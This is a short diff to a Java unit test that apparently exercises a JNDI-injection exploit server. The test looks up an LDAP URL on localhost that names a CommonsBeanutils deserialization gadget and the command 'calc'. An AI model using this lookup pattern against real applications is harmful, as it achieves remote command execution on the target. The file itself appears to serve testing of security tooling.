@@ -16,8 +16,9 @@ public class CiTest {
     @Test
     public void jndi() throws NamingException
     {
+        String gadget = "CommonsBeanutils2183NOCC";
         Context ctx = new InitialContext();
-        Object result = ctx.lookup("ldap://127.0.0.1:1389/Deserialize/Jackson/Command/Y2FsYw==");
+        Object result = ctx.lookup("ldap://127.0.0.1:1389/Deserialize/"+gadget+"/Command/calc");
     }
 
 }
